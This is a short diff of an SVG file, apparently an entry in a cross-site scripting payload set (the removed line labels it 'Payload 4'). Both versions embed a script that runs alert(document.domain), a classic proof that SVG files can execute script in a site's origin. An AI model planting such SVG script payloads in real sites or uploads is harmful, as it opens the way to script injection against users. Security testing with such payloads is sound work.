@@ -1,8 +1,8 @@
-<!-- Payload 4 -->
-<svg xmlns="http://www.w3.org/2000/svg">
-  <script>
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
+  <circle cx="50" cy="50" r="40" fill="red" />
+  <script type="text/javascript">
     <![CDATA[
-      alert(document.domain)
+      alert(document.domain);
     ]]>
   </script>
 </svg>
